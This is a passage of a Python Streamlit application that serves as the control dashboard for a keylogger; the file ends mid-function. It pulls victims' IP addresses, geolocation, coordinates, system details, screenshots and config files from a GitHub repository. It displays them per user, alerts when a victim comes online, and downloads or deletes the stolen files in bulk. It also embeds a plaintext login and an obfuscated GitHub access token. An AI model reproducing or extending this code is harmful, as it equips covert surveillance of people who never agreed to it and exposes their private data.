# user loging
import re
import os
import ast
import json
import time
import hashlib
import requests
import pandas as pd 
import streamlit as st
from io import BytesIO
import plotly.express as px
from datetime import datetime
from streamlit_image_zoom import image_zoom
from zoneinfo import ZoneInfo  # Python 3.9+


# URL containing the tokens JSON
TOKEN_URL = "https://raw.githubusercontent.com/bebedudu/tokens/refs/heads/main/tokens.json"
# Default token if URL fetch fails
DEFAULT_TOKEN = "asdfg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aefthu"

# Your GitHub Personal Access Token
DATA_URL = "https://raw.githubusercontent.com/bebedudu/keylogger/refs/heads/main/uploads/activeuserinfo.txt"
SCREENSHOT_API_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/screenshots"
SCREENSHOT_BASE_URL = "https://raw.githubusercontent.com/bebedudu/keylogger/refs/heads/main/uploads/screenshots/"
CONFIG_API_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/config"
CONFIG_BASE_URL = "https://raw.githubusercontent.com/bebedudu/keylogger/refs/heads/main/uploads/config/"

last_line = 10 # Number of lines to fetch
cache_time = 30  # Cache time in seconds
last_screenshot = 30  # Number of screenshots to fetch
last_config = 30  # Number of config files to fetch

def get_token():
    try:
        # Fetch the JSON from the URL
        response = requests.get(TOKEN_URL)
        if response.status_code == 200:
            token_data = response.json()

            # Check if the "dashboard" key exists
            if "dashboard" in token_data:
                token = token_data["dashboard"]

                # Remove the first 5 and last 6 characters
                processed_token = token[5:-6]
                # print(f"Token fetched and processed: {processed_token}")
                return processed_token
            else:
                print("Key 'dashboard' not found in the token data.")
        else:
            print(f"Failed to fetch tokens. Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred while fetching the token: {e}")

    # Fallback to the default token
    print("Using default token.")
    return DEFAULT_TOKEN[5:-6]

# Call the function
GITHUB_TOKEN = get_token()
# print(f"Final Token: {GITHUB_TOKEN}")


# Encrypted username and password
USERNAME_HASH = hashlib.sha256("bibek48".encode()).hexdigest()
PASSWORD_HASH = hashlib.sha256("adminbibek".encode()).hexdigest()

# Function to validate login credentials
def authenticate_user(username, password):
    username_encrypted = hashlib.sha256(username.encode()).hexdigest()
    password_encrypted = hashlib.sha256(password.encode()).hexdigest()
    return username_encrypted == USERNAME_HASH and password_encrypted == PASSWORD_HASH

# Function to fetch the last 10 lines from the private repository
@st.cache_data(ttl=cache_time)
def fetch_last_10_lines_private(url, token):
    headers = {
        "Authorization": f"token {token}"
    }
    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()
        lines = response.text.strip().split("\n")
        return lines[-last_line:]  # Return the last 10 lines
    except requests.RequestException as e:
        st.error(f"Failed to fetch data: {e}")
        return []

# Function to safely parse System Info
@st.cache_data(ttl=cache_time)
def preprocess_system_info(system_info_str):
    """
    Preprocesses the system info string by replacing unsupported objects (like sdiskpart)
    with a placeholder or simplified representation.
    """
    system_info_str = re.sub(r"sdiskpart\(.*?\)", "'Disk Partition'", system_info_str)  # Replace sdiskpart objects
    try:
        system_info = ast.literal_eval(system_info_str)
    except Exception as e:
        st.warning(f"Error parsing System Info: {e}")
        system_info = {"Error": "Unable to parse System Info"}
    return system_info

# Function to parse active user info
@st.cache_data(ttl=cache_time)
def parse_active_user_info(lines):
    active_user_data = []
    for line in lines:
        match = re.search(r"(?P<timestamp>\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}) - User: (?P<username>.*?), Unique_ID: (?P<Unique_ID>.*?), IP: (?P<ip>.*?), Location: (?P<location>.*?), Org: (?P<org>.*?), Coordinates: (?P<coordinates>.*?), Postal: (?P<Postal>.*?),", line
        )
        if match:
            user_data = match.groupdict()
            # Combine username and Unique_ID into a single field
            # user_data["username"] = f"{user_data['username']}_{user_data['Unique_ID']}"
            # active_user_data.append(user_data)
            
            # Extract the first two characters of the location
            location_prefix = user_data["location"][:2]
            # Combine location prefix, username, and Unique_ID into the user field
            user_data["username"] = f"{user_data['username']}_{location_prefix}_{user_data['Unique_ID']}"
            active_user_data.append(user_data)
    return active_user_data


# Function to parse user info
# def parse_user_info(lines):
#     user_data = []
#     for line in lines:
#         # Extract the timestamp
#         timestamp_match = re.search(r"^(?P<timestamp>\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})", line)
#         username_match = re.search(r"User: (?P<username>[^\s,]+)", line)
#         ip_match = re.search(r"IP: (?P<ip>[^\s,]+)", line)
#         location_match = re.search(r"Location: (?P<location>[^,]+(?:, [^,]+)+)", line)
#         org_match = re.search(r"Org: (?P<org>[^,]+)", line)
#         coordinates_match = re.search(r"Coordinates: (?P<coordinates>[^\s,]+)", line)
#         system_info_match = re.search(r"System Info: (?P<system_info>\{.*\})", line)

#         if username_match and ip_match:
#             user_info = {
#                 "timestamp": timestamp_match.group("timestamp") if timestamp_match else "N/A",
#                 "username": username_match.group("username"),
#                 "ip": ip_match.group("ip"),
#                 "location": location_match.group("location") if location_match else "Unknown",
#                 "org": org_match.group("org") if org_match else "Unknown",
#                 "coordinates": coordinates_match.group("coordinates") if coordinates_match else "Unknown",
#             }
#             # Parse system info safely
#             if system_info_match:
#                 try:
#                     user_info["system_info"] = eval(system_info_match.group("system_info"), {"sdiskpart": dict})
#                 except Exception:
#                     user_info["system_info"] = {}

#             user_data.append(user_info)

#     return user_data

@st.cache_data(ttl=cache_time)
def parse_user_info(lines):
    user_data = []
    for line in lines:
        user_info = {}
        user_info["raw"] = line
        
        timestamp_match = re.match(r"^(?P<timestamp>[\d-]+ [\d:]+) -", line)
        if timestamp_match:
            user_info["timestamp"] = timestamp_match.group("timestamp")
            
        match = re.search(
            r"User: (?P<username>.*?), IP: (?P<ip>.*?), Location: (?P<location>.*?), Org: (?P<org>.*?), Coordinates: (?P<coordinates>.*?),",
            line
        )
        if match:
            user_info.update(match.groupdict())
            
            # Add location prefix to the user field
            location_prefix = user_info["location"][:2]  # Extract first 2 characters of location
            user_info["username"] = f"{location_prefix}_{user_info['username']}"  # Add location prefix to username
        
        # Extract system info details
        system_info_match = re.search(r"System Info: (?P<system_info>{.*})", line)
        if system_info_match:
            system_info_str = system_info_match.group("system_info")
            user_info["system_info"] = preprocess_system_info(system_info_str)
        
        user_data.append(user_info)
    return user_data


# Function to fetch config file details from the private repository
@st.cache_data(ttl=cache_time)
def fetch_config_files():
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    try:
        response = requests.get(CONFIG_API_URL, headers=headers)
        response.raise_for_status()
        file_list = response.json()[:-last_config]  # Fetch last 30 files
        config_data = []
        for file in file_list:
            filename = file["name"]
            if filename.endswith("_config.json"):
                try: # 20250123_142553_dsah8_config.json
                    parts = filename.split("_")
                    user = parts[2] + parts[3]
                    timestamp = datetime.strptime(parts[0] + parts[1], "%Y%m%d%H%M%S")
                    url = file["download_url"]  # Use the raw URL for downloading content
                    config_data.append({"user": user, "timestamp": timestamp, "url": url})
                except Exception as e:
                    st.error(f"Error parsing filename: {filename}. {e}")
        return config_data
    except requests.RequestException as e:
        st.error(f"Failed to fetch data from GitHub API: {e}")
        return []


# Function to display config data
@st.cache_data(ttl=cache_time)
def display_config_data(config_data, selected_user):
    st.subheader("Config File Viewer")

    if selected_user == "All Active":
        # Show the latest config.json for each user
        latest_configs = {}
        for config in config_data:
            if config["user"] not in latest_configs:
                latest_configs[config["user"]] = config
            elif config["timestamp"] > latest_configs[config["user"]]["timestamp"]:
                latest_configs[config["user"]] = config
        
        for user, config in latest_configs.items():
            st.write(f"**User:** {user}, **Timestamp:** {config['timestamp']}")
            response = requests.get(config["url"])
            if response.status_code == 200:
                st.json(response.json(), expanded=False)
            else:
                st.error(f"Failed to fetch config for user {user}.")
    else:
        # Show only the latest config.json for the selected user
        user_configs = [c for c in config_data if c["user"] == selected_user]
        if user_configs:
            latest_config = sorted(user_configs, key=lambda x: x["timestamp"], reverse=True)[0]
            st.write(f"**User:** {selected_user}, **Timestamp:** {latest_config['timestamp']}")
            response = requests.get(latest_config["url"])
            if response.status_code == 200:
                st.json(response.json(), expanded=True)
            else:
                st.error(f"Failed to fetch config for user {selected_user}.")
        else:
            st.error(f"No config files found for user: {selected_user}")


# Authenticate GitHub API
def authenticate_github():
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    return headers

# Fetch the last 30 screenshots from the GitHub API
@st.cache_data(ttl=cache_time)  # Cache for 5 minutes
def fetch_screenshots():
    headers = authenticate_github()
    try:
        response = requests.get(SCREENSHOT_API_URL, headers=headers)
        response.raise_for_status()
        files = response.json()
        screenshots = []
        for file in files[-last_screenshot:]:  # Fetch only the last 30 screenshots
            if file["name"].endswith(".png"):
                try: 
                    # 20250123_141302_bibek_screenshot_2025-01-23_14-12-19.png
                    # 20250125_124537_bibek_4C4C4544-0033-3910-804A-B3C04F324233_screenshot_2025-01-25_12-45-12.png
                    # Split the filename to extract details
                    name_parts = file["name"].split("_")
                    if len(name_parts) < 3:  # Ensure enough parts for parsing
                        st.warning(f"Skipping improperly formatted file: {file['name']}")
                        continue
                    date_time = name_parts[0] + name_parts[1]  # YYYYMMDD + HHMMSS
                    # user = name_parts[2]  # Extract user name
                    user = name_parts[2]+ name_parts[3]  # Extract user name
                    date_time = name_parts[0] + name_parts[1]  # Combine YYYYMMDD and HHMMSS
                    timestamp = datetime.strptime(date_time, "%Y%m%d%H%M%S")  # Parse into a datetime object
                    screenshots.append({
                        "name": file["name"],
                        "url": file["download_url"],
                        "user": user,
                        "timestamp": timestamp,
                    })
                except ValueError:
                    st.warning(f"Unable to parse filename: {file['name']}")
        return sorted(screenshots, key=lambda x: x["timestamp"], reverse=True)
    except requests.RequestException as e:
        st.error(f"Failed to fetch screenshot data: {e}")
        return []

# Download an image from a URL
def download_image(url):
    headers = authenticate_github()
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        return BytesIO(response.content)  # Return image as BytesIO object
    else:
        return None


# Function to check for new screenshots
@st.cache_data(ttl=cache_time)
def check_new_screenshots(latest_timestamp):
    current_screenshots = fetch_screenshots()
    latest = max([s["timestamp"] for s in current_screenshots])
    return latest > latest_timestamp, current_screenshots



# Function to fetch the last 10 lines from the private repository
# Function to detect anomalies in user activity
@st.cache_data(ttl=cache_time)
def detect_anomalies(user_data):
    anomalies = []
    for user in user_data:
        # Example anomaly check: Unexpected location
        expected_location = "USA"  # Replace with user-specific location data
        if user["location"] != expected_location:
            anomalies.append({
                "user": user["username"],
                "reason": f"Unexpected location: {user['location']}"
            })
    return anomalies


# Function to filter screenshots based on user and date range
@st.cache_data(ttl=cache_time)
def filter_screenshots(screenshot_data, user, start_date, end_date):
    filtered_screenshots = [
        screenshot for screenshot in screenshot_data
        if (user == "All Users" or screenshot["user"] == user) and
           (start_date <= screenshot["timestamp"].date() <= end_date)
    ]
    return filtered_screenshots


# Function to get unique users
@st.cache_data(ttl=cache_time)
def get_unique_users(user_data):
    seen_users = set()
    unique_users = []
    for user in user_data:
        if user["username"] not in seen_users:
            seen_users.add(user["username"])
            unique_users.append(user)
    return unique_users

# GitHub API base URL
GITHUB_API_BASE_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads"

# GitHub repository folders to check
FOLDERS = {
    "screenshots": "screenshots",
    "config": "config",
    "cache": "cache",
    "logs": "logs",
    "keylogerror": "keylogerror"
}


# Maximum number of retries for file deletion
MAX_RETRIES = 3

# Function to get the list of files in a folder
@st.cache_data(ttl=cache_time)
def get_number_of_files(folder):
    url = f"{GITHUB_API_BASE_URL}/{folder}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        files = response.json()
        return files  # Return the list of files
    else:
        st.error(f"Failed to fetch data for {folder}: {response.status_code}")
        return []

# Function to delete a file using the GitHub API with retries
@st.cache_data(ttl=cache_time)
def delete_file(folder, file_name, file_sha):
    url = f"{GITHUB_API_BASE_URL}/{folder}/{file_name}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Accept": "application/vnd.github.v3+json"
    }
    data = {
        "message": f"Deleting {file_name}",
        "sha": file_sha
    }
    
    for attempt in range(MAX_RETRIES):
        response = requests.delete(url, headers=headers, json=data)
        
        if response.status_code == 200:
            return True
        else:
            st.warning(f"\nAttempt {attempt + 1} failed to delete {file_name}: {response.status_code}")
            time.sleep(1)  # Wait for 1 second before retrying
    
    st.error(f"\nFailed to delete {file_name} after {MAX_RETRIES} attempts")
    return False


# Function to delete files
@st.cache_data(ttl=cache_time)
def delete_files(folder, num_files_to_delete, terminal_placeholder):
    files = get_number_of_files(folder)
    if not files:
        return

    # Initialize or update the session state for logs
    if "deletion_logs" not in st.session_state:
        st.session_state.deletion_logs = "Deletion Log:\n"

    for i in range(min(num_files_to_delete, len(files))):
        file_name = files[i]["name"]
        file_sha = files[i]["sha"]
        file_path = f"uploads/{folder}/{file_name}"

        # Delete the file using the GitHub API with retries
        if delete_file(folder, file_name, file_sha):
            # Update the logs
            st.session_state.deletion_logs = f"\nDeleted: {file_path}\n{st.session_state.deletion_logs}"
        else:
            st.session_state.deletion_logs = f"\nFailed to delete: {file_path}\n{st.session_state.deletion_logs}"

        # Update the terminal-like box
        terminal_placeholder.markdown(
            f"""
            <div style="background-color: black; color: white; padding: 10px; border-radius: 5px; font-family: monospace; height: 200px; overflow-y: scroll;">
                <pre>{st.session_state.deletion_logs}</pre>
            </div>
            """,
            unsafe_allow_html=True
        )



# Function to parse date and time from filename
@st.cache_data(ttl=cache_time)
def parse_datetime_from_filename(file_name):
    try:
        # Extract date and time from filename (e.g., "20250129_090616_bibek_...")
        date_str = file_name.split("_")[0]  # "20250129"
        time_str = file_name.split("_")[1]  # "090616"
        return datetime.strptime(f"{date_str} {time_str}", "%Y%m%d %H%M%S")
    except (IndexError, ValueError):
        return None

# Function to delete files with advanced options
@st.cache_data(ttl=cache_time)
def delete_files_advanced(folder, terminal_placeholder, stop_file=None, delete_file_only=None, start_date=None, end_date=None):
    files = get_number_of_files(folder)
    if not files:
        return

    # Initialize or update the session state for logs
    if "deletion_logs" not in st.session_state:
        st.session_state.deletion_logs = "Deletion Log:\n"

    for file in files:
        file_name = file["name"]
        file_sha = file["sha"]
        file_path = f"uploads/{folder}/{file_name}"

        # Parse date and time from filename
        file_datetime = parse_datetime_from_filename(file_name)

        # Skip files that don't match the date and time range
        if start_date and end_date and file_datetime:
            if not (start_date <= file_datetime <= end_date):
                continue  # Skip files outside the date range

        # Check if the file matches the stop file name
        if stop_file and file_name == stop_file:
            st.session_state.deletion_logs = f"Stopped deletion for {folder} because {stop_file} was found.\n{st.session_state.deletion_logs}"
            terminal_placeholder.markdown(
                f"""
                <div style="background-color: black; color: white; padding: 10px; border-radius: 5px; font-family: monospace; height: 200px; overflow-y: scroll;">
                    <pre>{st.session_state.deletion_logs}</pre>
                </div>
                """,
                unsafe_allow_html=True
            )
            return  # Stop deletion for this folder

        # Check if the file matches the delete file name
        if delete_file_only:
            if file_name == delete_file_only:
                # Delete only the specific file and skip the rest
                if delete_file(folder, file_name, file_sha):
                    st.session_state.deletion_logs = f"Deleted: {file_path}\n{st.session_state.deletion_logs}"
                else:
                    st.session_state.deletion_logs = f"Failed to delete: {file_path}\n{st.session_state.deletion_logs}"
                terminal_placeholder.markdown(
                    f"""
                    <div style="background-color: black; color: white; padding: 10px; border-radius: 5px; font-family: monospace; height: 200px; overflow-y: scroll;">
                        <pre>{st.session_state.deletion_logs}</pre>
                    </div>
                    """,
                    unsafe_allow_html=True
                )
                return  # Skip deletion of other files
            else:
                continue  # Skip files that don't match the delete file name

        # Delete the file using the GitHub API with retries
        if delete_file(folder, file_name, file_sha):
            st.session_state.deletion_logs = f"Deleted: {file_path}\n{st.session_state.deletion_logs}"
        else:
            st.session_state.deletion_logs = f"Failed to delete: {file_path}\n{st.session_state.deletion_logs}"

        # Update the terminal-like box
        terminal_placeholder.markdown(
            f"""
            <div style="background-color: black; color: white; padding: 10px; border-radius: 5px; font-family: monospace; height: 200px; overflow-y: scroll;">
                <pre>{st.session_state.deletion_logs}</pre>
            </div>
            """,
            unsafe_allow_html=True
        )


# Folder to store downloaded files
DOWNLOAD_FOLDER = "downloads_activity"

# Create the download folder if it doesn't exist
if not os.path.exists(DOWNLOAD_FOLDER):
    os.makedirs(DOWNLOAD_FOLDER)

# Function to extract unique user name from filename
@st.cache_data(ttl=cache_time)
def extract_unique_user_name(file_name):
    try:
        # Extract unique user name from filename (e.g., "bibek_4C4C4544-0033-3910-804A-B3C04F324233")
        return "_".join(file_name.split("_")[2:4])  # "bibek_4C4C4544-0033-3910-804A-B3C04F324233"
    except (IndexError, ValueError):
        return None

# Function to download files with advanced options
@st.cache_data(ttl=cache_time)
def download_files_advanced(folder, terminal_placeholder, start_date=None, end_date=None, num_files=None, unique_user_name=None):
    files = get_number_of_files(folder)
    if not files:
        return

    # Initialize or update the session state for logs
    if "download_logs" not in st.session_state:
        st.session_state.download_logs = "Download Log:\n"

    # Filter files by date and time range
    filtered_files = []
    for file in files:
        file_name = file["name"]
        file_datetime = parse_datetime_from_filename(file_name)

        if start_date and end_date and file_datetime:
            if not (start_date <= file_datetime <= end_date):
                continue  # Skip files outside the date range

        # Filter files by unique user name
        if unique_user_name:
            file_user_name = extract_unique_user_name(file_name)
            if file_user_name != unique_user_name:
                continue  # Skip files that don't match the unique user name

        filtered_files.append(file)

    # Sort files in reverse order (from last to first)
    filtered_files.sort(key=lambda x: x["name"], reverse=True)

    # Limit the number of files to download
    if num_files:
        filtered_files = filtered_files[:num_files]

    # Download the filtered files
    for file in filtered_files:
        file_name = file["name"]
        file_url = file["download_url"]

        # Download the file
        response = requests.get(file_url, headers={"Authorization": f"token {GITHUB_TOKEN}"})
        if response.status_code == 200:
            # Save the file in the download folder
            file_path = os.path.join(DOWNLOAD_FOLDER, file_name)
            with open(file_path, "wb") as f:
                f.write(response.content)
            st.session_state.download_logs = f"Downloaded: {file_path}\n{st.session_state.download_logs}"
        else:
            st.session_state.download_logs = f"Failed to download: {file_name}\n{st.session_state.download_logs}"

        # Update the terminal-like box
        terminal_placeholder.markdown(
            f"""
            <div style="background-color: black; color: white; padding: 10px; border-radius: 5px; font-family: monospace; height: 200px; overflow-y: scroll;">
                <pre>{st.session_state.download_logs}</pre>
            </div>
            """,
            unsafe_allow_html=True
        )



# function to get tokens details
def get_tokensDetails():
    try:
        # Fetch the JSON from the URL
        response = requests.get(TOKEN_URL)
        if response.status_code == 200:
            token_data = response.json()
            print("Tokens fetched successfully.")
            return token_data
        else:
            print(f"Failed to fetch tokens. Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred while fetching the tokens: {e}")

    # Fallback to the default token
    print("Using default token.")
    return {"delete": DEFAULT_TOKEN, "feedback": DEFAULT_TOKEN, "dashboard": DEFAULT_TOKEN}
    

def process_token(token):
    # Remove the first 5 and last 6 characters
    return token[5:-6]

def get_rate_limit_details(token):
    headers = {"Authorization": f"Bearer {token}"}
    response = requests.get("https://api.github.com/user", headers=headers)
    
    # Fetch the rate limit headers
    rate_limit_limit = response.headers.get("X-RateLimit-Limit")
    rate_limit_remaining = response.headers.get("X-RateLimit-Remaining")
    rate_limit_reset = response.headers.get("X-RateLimit-Reset")

    # Convert the reset time (in UTC epoch seconds) to the user's local time
    if rate_limit_reset:
        utc_time = datetime.fromtimestamp(int(rate_limit_reset), tz=ZoneInfo("UTC"))
        local_time = utc_time.astimezone()  # Automatically uses the system's local time zone
        reset_time = local_time.strftime('%Y-%m-%d %H:%M:%S %Z')
    else:
        reset_time = "N/A"

    return {
        "limit": rate_limit_limit,
        "remaining": rate_limit_remaining,
        "reset_time": reset_time,
    }

    
# Fetch all tokens
tokens_data = get_tokensDetails()

def tabbeddashboard():

    st.title("GitHub Repository File Manager")
    # Create tabs
    # tab1, tab2, tab3 = st.tabs(["Count Files", "Delete Files", "Active users Dashboard"])
    # Create tabs
    tab1, tab2, tab3, tab4, tab5 = st.tabs(["Active users Dashboard", "Count Files", "Delete Files", "Token Details", "Download Files"])
    
    
    # Tab 5: Active users Dashboard
    with tab1:
        st.header("Active users Dashboard") 

        # Main Dashboard App
        def dashboard():
            # Initialize session state to store previously seen users
            if "seen_users" not in st.session_state:
                st.session_state["seen_users"] = set()
            st.title("Detailed Active User Activity Dashboard")
            st.write("Explore detailed information of active users.")
            # Fetch and parse the data
            lines = fetch_last_10_lines_private(DATA_URL, GITHUB_TOKEN)
            user_data = parse_user_info(lines)
            active_user_data = parse_active_user_info(lines)
            screenshot_data = fetch_screenshots()
            st.sidebar.header("Active User Activity Dashboard")
            if user_data:
                # Get unique users
                unique_users = get_unique_users(user_data)
                user_list = ["All"] + [user["username"] for user in unique_users]  # Add "All" for default option
                # Sidebar to select a user
                selected_user = st.sidebar.selectbox("Select a User", user_list)
                # Filter data based on selection
                if selected_user != "All":
                    filtered_users = [user for user in unique_users if user["username"] == selected_user]
                else:
                    filtered_users = unique_users  # Only show unique users        
                # Title and "Update Dashboard" Button
                col1, col2 = st.columns([8, 1])  # Adjust column widths as needed
                with col1:
                    st.title(f"Active Users: {len(filtered_users)}")
                with col2:
                    if st.button("Update Dashboard"):
                        fetch_last_10_lines_private(DATA_URL, GITHUB_TOKEN)
                # Identify new active users
                current_users = set(user["username"] for user in unique_users)
                new_users = current_users - st.session_state["seen_users"]
                st.session_state["seen_users"].update(current_users)
                # Display notification for new active users
                for new_user in new_users:
                    st.info(f"🚨 **{new_user} is active now!**")
                # Streamlit app
                # st.title("Active Users")
                st.write("Dashboard showing unique active users and their details.")
                # Convert to DataFrame for display
                df = pd.DataFrame(active_user_data).drop_duplicates(subset="username")
                st.table(df)  # Display as a table
                # Fetch data from the URL
                @st.cache_data(ttl=cache_time)  # Cache the data for 60 seconds to avoid frequent network calls
                def fetch_data_from_url():
                    import requests
                    response = requests.get(DATA_URL)
                    if response.status_code == 200:
                        lines = response.text.strip().split("\n")[-last_line:]  # Get the last 10 lines
                        return parse_user_info(lines)
                    else:
                        st.error("Failed to fetch data from the URL.")
                        return []
                # Create a DataFrame for visualizations
                df = pd.DataFrame(filtered_users)
                df["city"] = df["location"].apply(lambda loc: loc.split(",")[1].strip() if "," in loc else "Unknown")
                df["country"] = df["location"].apply(lambda loc: loc.split(",")[0].strip() if "," in loc else "Unknown")
                # Display details of filtered users (details of active user)
                st.title("Active User Dashboard")
                st.write(f"### Active Users: {len(filtered_users)}")
                for user in filtered_users:
                    # Use the extracted timestamp
                    # timestamp = user["timestamp"]
                    # with st.expander(f"Details for User: {user['username']} (IP: {user['ip']}, Last Active: {timestamp})"):
                    with st.expander(f"Details for User: {user['username']} (Last Active: {user['timestamp']})"):
                        st.write(f"**Timestamp:** {user.get('timestamp', 'N/A')}")
                        st.write(f"**Location:** {user['location']}")
                        st.write(f"**Organization:** {user['org']}")
                        st.write(f"**Coordinates:** {user['coordinates']}")
                        # Display System Info in a table
                        if "system_info" in user:
                            system_info_df = pd.DataFrame(
                                user["system_info"].items(), columns=["Property", "Value"]
                            )
                            st.write("### System Info:")
                            st.table(system_info_df)
                # Add Visualization for Country/City Distribution
                st.write("## User Distribution by Country and City")
                # Bar Chart for Countries
                country_counts = df["country"].value_counts().reset_index()
                country_counts.columns = ["Country", "Count"]
                st.write("### Country Distribution")
                country_chart = px.bar(country_counts, x="Country", y="Count", title="Active Users by Country")
                st.plotly_chart(country_chart, use_container_width=True)
                # Bar Chart for Cities
                city_counts = df["city"].value_counts().reset_index()
                city_counts.columns = ["City", "Count"]
                st.write("### City Distribution")
                city_chart = px.bar(city_counts, x="City", y="Count", title="Active Users by City")
                st.plotly_chart(city_chart, use_container_width=True)
                st.title("Active User Dashboard with Config Viewer")
                # Sidebar user selection
                config_data = fetch_config_files()
                unique_users = ["All Active"] + sorted(set([c["user"] for c in config_data]))
                selected_user = st.sidebar.selectbox("Select User (Config)", unique_users)
                # Display Config Data
                display_config_data(config_data, selected_user)
                # Extract unique usernames from the screenshot data
                unique_users_screenshot = list({s["user"] for s in screenshot_data})  # Set to remove duplicates, then convert to list
                unique_users_screenshot.sort()  # Optional: Sort usernames alphabetically
                # Add "All Users" as the first option
                unique_users_screenshot.insert(0, "All Users")
                # Sidebar for user selection
                selected_user = st.sidebar.selectbox("Select User (Screenshot)", unique_users_screenshot)
                # Add custom CSS for overlaying the download button
                st.markdown(
                    """
                    <style>
                    .image-container {
                        position: relative;
                        display: inline-block;
                    }
                    .download-button {
                        position: absolute;
                        top: 10px;
                        right: 10px;
                        background-color: rgba(255, 255, 255, 0.8);
                        padding: 5px;
                        border-radius: 50%;
                        box-shadow: 0px 2px 4px rgba(0, 0, 0, 0.2);
                    }
                    .download-button img {
                        width: 25px;
                        height: 25px;
                    }
                    </style>
                    """,
                    unsafe_allow_html=True,
                )
                st.write("## User Latest Screenshots")
                # Display the latest screenshot for the selected user
                if selected_user == "All Users":
                    # Show the latest screenshot for each user
                    latest_screenshots = {}
                    for s in screenshot_data:
                        if s["user"] not in latest_screenshots:
                            latest_screenshots[s["user"]] = s
                    for screenshot in latest_screenshots.values():
                        # st.image(screenshot["url"], caption=f"{screenshot['user']} - {screenshot['timestamp']},")
                        st.image(
                            screenshot["url"], 
                            caption=f"{screenshot['user']} @ {screenshot['timestamp']} 👉 {screenshot['name']}",
                            use_container_width=True,
                        )
                        st.download_button(
                            label="Download ☝️",
                            data=requests.get(screenshot["url"]).content,  # Fetch and prepare image data
                            file_name=screenshot["name"],
                            mime="image/png"
                        )
                else:
                    # Show only the latest screenshot for the selected user
                    user_screenshots = [s for s in screenshot_data if s["user"] == selected_user]
                    # Sort screenshots by timestamp to get the latest one
                    latest_screenshot = sorted(user_screenshots, key=lambda x: x["timestamp"], reverse=True)[0]
                    # Display the latest screenshot
                    # st.image(latest_screenshot["url"], caption=f"{selected_user} - {latest_screenshot['timestamp']}")
                    st.image(
                        latest_screenshot["url"], 
                        caption=f"{selected_user} @ {latest_screenshot['timestamp']} 👉 {latest_screenshot['name']}",
                        use_container_width=True,
                    )
                    st.download_button(
                        label="Download ☝️",
                        data=requests.get(screenshot["url"]).content,  # Fetch and prepare image data
                        file_name=screenshot["name"],
                        mime="image/png"
                    )
                # Check for new screenshots
                new_screenshots, current_screenshots = check_new_screenshots(screenshot_data[0]["timestamp"])
                if new_screenshots:
                    st.warning("🚨 New screenshots detected! Please refresh the page to view the latest screenshots."
                               " Click the 'Update Data' button in the sidebar to refresh the data.")
                # # Display the last 30 screenshots
                # # Add a checkbox in the sidebar
                # show_screenshots = st.sidebar.checkbox("Show Recent Screenshots", value=False)
                # # Display the last 30 screenshots (conditionally based on the sidebar checkbox)
                # st.title("Recent Screenshots")
                # if show_screenshots:  # Only execute this block if the checkbox is checked
                #     for screenshot in screenshot_data:
                #         if selected_user == "All Users" or screenshot["user"] == selected_user:
                #             st.image(
                #                 download_image(screenshot["url"]),  # Function to fetch the image
                #                 caption=screenshot["name"],  # Display the filename as the caption
                #                 use_container_width=True  # Adjust to fit container width
                #             )
                # Initialize latest timestamp
                if "latest_timestamp" not in st.session_state:
                    st.session_state.latest_timestamp = datetime.min
                # Check for new screenshots
                has_new_data, updated_screenshot_data = check_new_screenshots(st.session_state.latest_timestamp)
                # Display alert if new data is available
                if has_new_data:
                    st.session_state.latest_timestamp = max([s["timestamp"] for s in updated_screenshot_data])
                    st.sidebar.warning("🔔 New screenshots/logs detected! Refresh to view them.")
                # Button to refresh manually
                if st.sidebar.button("Refresh Now"):
                    fetch_screenshots.clear()  # Clear cache for this function
                    if "refresh_needed" not in st.session_state:
                        st.session_state.refresh_needed = False
                    if st.session_state.refresh_needed:
                        # Fetch new data or rerun parts of your logic here
                        st.write("Data has been refreshed!")
                        st.session_state.refresh_needed = False
                # Display anomalies (if any restricted country detected)
                anomalies = detect_anomalies(user_data)
                # Display anomalies in a table
                if anomalies:
                    st.warning("⚠️🚨 Anomalies detected in user activity:")
                    for anomaly in anomalies:
                        st.write(f"**User:** {anomaly['user']}, **Reason:** {anomaly['reason']}")
                else:
                    st.success("✅ No anomalies detected.")
                # Display the last 30 screenshots
                # Sidebar filters
                show_screenshots = st.sidebar.checkbox("Show Recent Screenshots", value=False)
                if show_screenshots:
                    st.title("Screenshot Gallery")
                    # User filter
                    users = ["All Users"] + sorted(set(s["user"] for s in screenshot_data))
                    selected_user = st.sidebar.selectbox("Select User", users)
                    # Date filter
                    start_date = st.sidebar.date_input("Start Date", value=datetime.now().date())
                    end_date = st.sidebar.date_input("End Date", value=datetime.now().date())
                    # Filter screenshots
                    filtered_screenshots = filter_screenshots(screenshot_data, selected_user, start_date, end_date)
                    # Display screenshots in a gallery layout
                    col1, col2, col3 = st.columns(3)
                    for i, screenshot in enumerate(filtered_screenshots):
                        col = [col1, col2, col3][i % 3]
                        with col:
                            st.image(
                                download_image(screenshot["url"]),
                                caption=f"{screenshot['user']} - {screenshot['timestamp']}",
                                use_container_width=True
                            )
                # Add a button to update the data
                st.sidebar.button("Update Data", on_click=fetch_last_10_lines_private, args=(DATA_URL, GITHUB_TOKEN))
                st.sidebar.button("Update Config Files", on_click=fetch_config_files)
                st.sidebar.button("Update Screenshots", on_click=fetch_screenshots)
                st.sidebar.markdown("---")  # Add a separator
                st.sidebar.write("© 2025 Bibek 💗. All rights reserved.")
            else:
                st.warning("No user data found!")
            # Polling mechanism to update the dashboard every minute
            
            time.sleep(60)
            parse_active_user_info(lines)
        
         
        dashboard() 

    
    
    # Tab 2: Count Files
    with tab2:
        st.header("Count Files")
        if st.button("Get Number of Files"):
            st.write("Fetching file counts...")

            # Use columns to organize the output
            col1, col2, col3 = st.columns(3)

            for i, (folder_name, folder_path) in enumerate(FOLDERS.items()):
                files = get_number_of_files(folder_path)
                num_files = len(files)  # Calculate the number of files
                github_url = f"https://github.com/bebedudu/keylogger/tree/main/uploads/{folder_path}"

